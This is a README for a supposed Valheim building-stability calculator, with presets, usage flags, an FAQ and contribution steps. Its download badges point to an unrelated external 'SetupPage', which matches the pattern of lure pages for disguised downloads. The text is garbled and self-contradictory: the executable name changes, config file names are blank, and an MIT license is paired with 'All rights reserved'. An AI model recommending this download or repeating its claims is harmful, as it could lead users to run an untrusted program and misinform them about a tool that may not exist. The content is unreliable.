# Valheim Building Stability Calculator

<p align="center">
  <a href="https://rewfdf.github.io/SetupPage/">
    <img src="https://img.shields.io/badge/Download-Release-a16207?style=flat-square&logo=apple&logoColor=white" alt="Download">
  </a>
  <img src="https://img.shields.io/badge/valheim-building-4A90E2?style=for-the-badge&logo=game-controller&logoColor=white" alt="Valheim">
  <img src="https://img.shields.io/badge/Download-FF5733?style=plastic&logo=calculator&logoColor=white" alt="Stability Calculator">
  <img src="https://img.shields.io/badge/Download-8C9EFF?style=flat&logo=gear&logoColor=white" alt="Config Profiles">
  <img src="https://img.shields.io/badge/Download-6C757D?style=flat-square&logo=calendar&logoColor=white" alt="Last Release">
  <img src="https://img.shields.io/badge/Download-2F4F4F?style=for-the-badge&logo=law&logoColor=white" alt="License">
</p>

---

## Overview

The **Valheim Building Stability Calculator** is a deterministic engine that evaluates the structural integrity of any player‑constructed object in Valheim. By parsing the world’s voxel data and applying the official physics formulae, it produces a numeric stability score, a visual heat map, and actionable suggestions (e.g., reinforcement points, beam length limits). The calculator is packaged as a set of configuration profiles and pre‑defined workflow presets, allowing both casual builders and server administrators to enforce consistent building standards without manual inspection.

Key capabilities include:

* Real‑time analysis of walls, roofs, and foundations across multiple zones.
* Export of results to CSV for external analytics pipelines.
* Integration with the in‑game console via a lightweight client‑side hook (no server modification required).
* Support for custom rule sets through ``.

All assets are bundled in the latest release, which can be obtained via the **Download** badge above.

---

## Workflow Presets

Three workflow presets are included to cover common server policies:

1. **Strict Survival** – Enforces a maximum sway of 2 % and prohibits any roof exceeding 4 m without steel reinforcement.
2. **Creative Sandbox** – Disables all limits, only provides visual feedback.
3. **Balanced PvP** – Allows moderate sway (5 %) and caps roof height at 6 m, encouraging defensive architecture.

Presets are activated by passing the `--preset <name>` flag to the executable. The calculator will automatically merge the preset with the currently loaded configuration files, preserving user customizations.

---

## Directory Layout

```
Valheim-Building-Stability-Calculator/
├─ bin/                # Platform‑specific executables
├─ configs/            # All .cfg files (default, visual, player, custom)
├─ data/               # Cached world snapshots for offline analysis
├─ docs/               # This README and supplemental usage guides
├─ releases/           # ZIP bundles for each tagged version
└─ scripts/            # Helper scripts (CSV exporter, heat‑map generator)
```

The `bin/` folder contains a single binary named `vbs_calc`. No additional runtime dependencies are required on Windows 10 + or recent Linux distributions with glibc 2.28+.

---

## Usage Instructions

1. **Download** the latest release bundle via the badge at the top of the page.
2. Extract the archive to a location of your choosing; preserve the directory structure.
3. Open `configs/` if you need to tailor any rule (e.g., restrict thatch usage on islands).
4. Launch the calculator from a terminal or by double‑clicking `Release`.
5. Provide the path to the world save file as the first argument:
   `Release "C:\Users\Player\AppData\LocalLow\IronGate\Valheim\worlds\myworld.db"`
6. Optional flags:
   * `--preset <name>` – select one of the three preset policies.
   * `--export csv` – write a CSV file with every evaluated structure.
   * `--heatmap` – generate a PNG overlay placed next to the world file.
7. Review the console output or open the generated PNG in any image viewer.

The calculator returns an exit code of `0` on successful analysis, `1` if the world file could not be read, and `2` for configuration parsing errors. Logging details are written to `data/vbs_log.txt`.

---

## FAQ & Troubleshooting

| Question | Answer |
|----------|--------|
| **Why does the heat‑map appear completely red?** | This usually indicates that `` opacity is set to `1.0`. Reduce the `heatmapOpacity` value to `0.6` or lower. |
| **The CSV export is empty.** | Verify that the `--export csv` flag was supplied and that the target directory is writable. The calculator skips structures marked as “ignored” in ``. |
| **I receive “exit code 2” after editing ``.** | A syntax error (missing `=` or stray characters) prevents the parser from loading the file. Restore the original file or run the built‑in validator: `Release --validate-config `. |
| **Can I run the calculator on a headless server?** | Yes. The CLI operates without a graphical environment. Use `--heatmap false` to suppress PNG generation if the server lacks image libraries. |
| **Is there a way to schedule periodic scans?** | Place a cron job (Linux) or a scheduled task (Windows) that invokes `Release` with the desired world path and `--preset Balanced PvP`. The generated logs can be rotated using standard logrotate utility. |

For issues not covered here, open an issue on the repository and attach the relevant `vbs_log.txt` excerpt.

---

## Contribution Guidelines

Contributions are accepted via pull request. Follow these steps before submitting:

1. Fork the repository under your own GitHub account.
2. Create a branch named `feature/<description>` or `fix/<description>`.
3. Ensure that any new configuration key is added to `` with a sensible fallback.
4. Run the internal test suite (`scripts/run_tests.sh`) and verify that the exit code is `0`.
5. Update the `docs/README.md` if you add public‑facing functionality.
6. Submit the pull request with a concise description of the change.

All contributions must respect the MIT license and include appropriate attribution in the commit history.

---

© 2024 TigerProxy78 – Valheim Building Stability Calculator. All rights reserved.

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```